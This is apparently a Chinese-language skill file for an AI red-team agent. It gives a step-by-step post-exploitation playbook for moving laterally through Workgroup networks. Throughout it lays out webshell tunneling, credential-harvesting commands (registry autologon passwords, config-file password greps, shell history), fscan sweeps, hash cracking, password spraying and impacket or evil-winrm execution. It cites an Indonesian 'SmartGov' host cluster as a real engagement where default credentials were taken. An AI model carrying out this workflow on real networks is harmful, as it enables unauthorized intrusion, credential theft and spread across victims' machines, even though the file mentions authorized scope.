---
name: workgroup-lateral-movement
description: >-
  Workgroup（非域）内网横向流程：立足点本地收集(命令包)→内网测绘(arp/route 定段+fscan 经隧道段扫)→凭据获取与复用(弱口令/本地凭据/hashcat 破解闭环)→横向执行(ssh/db 四象限隧道+impacket 落地转发)→逐步深化。Use when PartOfDomain=FALSE/无域环境/Workgroup 网段横向/内网口令复用。
metadata:
  roles: [后渗透测试, 渗透测试]
  stages: [post]
  tags: [渗透测试, penetration-testing, 红队, 内网]
---

# Workgroup 内网横向流程

> 域判定为 `PartOfDomain=FALSE`（见 active-directory-attack 阶段 0）时走本流程。Workgroup 的核心打法是**口令复用 + 服务利用**：没有域信任链，横向靠「一台机器的凭据在另一台也好使」。印尼 SmartGov 机群（17 台 Workgroup）就是本流程的实战形态。

## 阶段 0：数据面就位（前提，缺了后面全卡）

1. `webshell_tunnel page+start`（经立足点壳建 socks5，动态出口自动注册 `tunnel:ws_<id>`）
2. `proxy_toggle select proxy_id=<tunnel出口>` ——★漏掉这步所有工具流量不走隧道
3. `proxy_status` 确认选中。ssh/db 工具此后对私网目标自动走隧道（私网无隧道会明确报错提醒）。

## 阶段 1：立足点本地收集（一次批量，别逐条）

**Windows 立足点**（webshell_exec / sliver_exec，只读命令包）：

```bat
ipconfig /all                                    :: 网卡/DNS/多宿主（定内网段）
arp -a & route print                             :: 活跃主机+其他网段（比盲扫省）
net user & net localgroup administrators          :: 本地账号/管理员组
tasklist /svc                                    :: 进程与服务（杀软/EDR 判断）
net share & wmic qfe get HotFixID                :: 共享+补丁面
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>nul  :: autologon 明文（常见横财）
```

**Linux 立足点**（ssh_exec / webshell_exec）：

```bash
ip a && ip route && cat /etc/resolv.conf         :: 网段/DNS
ss -tlnp && ps aux                                :: 监听+进程（内网服务线索）
cat ~/.bash_history ~/.ssh/known_hosts 2>/dev/null :: 历史+踩过的主机（known_hosts=横向目标清单!）
grep -rE 'password|passwd|secret' /opt/*/config* /var/www/*/WEB-INF 2>/dev/null | head  :: 配置凭据
crontab -l && ls /etc/cron*                      :: 计划任务（常有备份脚本带凭据）
```

落库：arp/route 产出的内网 IP 走自动登记（`tool_result_intranet`）；命令包结论写 fact；known_hosts/配置凭据 → `save_ssh_credential`/`save_db_credential` 或 fact。

## 阶段 2：内网测绘（fscan 经隧道）

1. **定段**：阶段 1 的 ipconfig/arp 已给出段（如 192.168.188.0/24）——不要盲目扫大段。
2. `fscan -h <网段或关键主机> -np -p 22,80,445,1433,3306,6379,8080,3389 -t 20`（会话已选隧道出口时 ALL_PROXY 自动生效；限端口限线程，授权范围内网才扫）。
3. 输出自动解析落库：开放端口/服务识别/Web 标题进资产与 fp/ 条目；**弱口令命中直接落 `auth/` confirmed**；POC 命中（MS17-010 等）落 finding/。
4. 重点盯：**未授权服务**（Redis 6379/MySQL 空口令/Docker 2375）与**内网 Web**（JRS/Tomcat 管理面——印尼实测默认口令 joeuser/joeuser 就是这么拿的）。

## 阶段 3：凭据获取与复用

| 来源 | 动作 | 落库 |
| --- | --- | --- |
| fscan 弱口令命中 | 直接是横向通行证 | 自动落 auth/；ssh/db 凭据顺手 save_*_credential |
| 本地搜集（阶段 1） | autologon/配置文件/备份脚本 | save 或 fact |
| hash 破解 | fscan 的 NetNTLMv2/域外 hash → hashcat（5600/1000）；Kerberoast 类不适用 Workgroup | hashcat 破解命中自动落 auth/ |
| 口令喷洒 | **ROE 明确允许才做**，≤2 次/小时/账号，netexec | 命中 → save |

**复用纪律**：每个新凭据立刻在已知主机清单上试（ssh_exec/db_query 私网自动走隧道；SMB 经 `proxy_controller action=tunnel_forward open` 拿落地地址跑 impacket/netexec）。失败的组合 attempt_record（防重复烧）。

## 阶段 4：横向执行 + 逐步深化

1. **SSH/DB**：直接用（四象限隧道拨号，无需手工代理）。
2. **SMB/WinRM**：`proxy_controller action=tunnel_forward open target_host=<ip> target_port=445|5985` → 拿 `127.0.0.1:<port>` → impacket（`psexec 'user:pass@hostname@127.0.0.1:port'` hostname@ 跳板语法）/ evil-winrm（NTLM 模式）。
3. **拿下新主机 → 回到阶段 1**（在新疆域重复本地收集）——Workgroup 横向是滚雪球，不是一次性扫完。
4. 发现可利用漏洞照常 record_vulnerability（test_depth≥L3）；未授权服务=直接落洞。

## 红线与纪律

- 仅授权范围内网；fscan 限端口限线程，爆破模块限速（fscan -t/-pwdf 控制）；
- 不破坏：Redis 未授权止步 proof（info 探测/写 proof 文件需 ROE），不改配置不删数据；
- 每阶段产物当轮落库（资产/auth/fact/负面结果四件套），不攒收尾；
- 杀软/EDR 在身（阶段 1 tasklist 判断）→ 后续动作过 evasion 决策链，别裸投。

## 与相邻流程的关系

- 域判定=TRUE → 走 `active-directory-attack`（本流程是其阶段 0 的另一半）。
- 数据面细节（隧道页部署/坑位）→ `tunnel-data-plane`。
- C2 载荷/上线 → `c2-opsec` + 后渗透测试角色（渗透测试角色无 sliver 工具面，触发交接条款）。
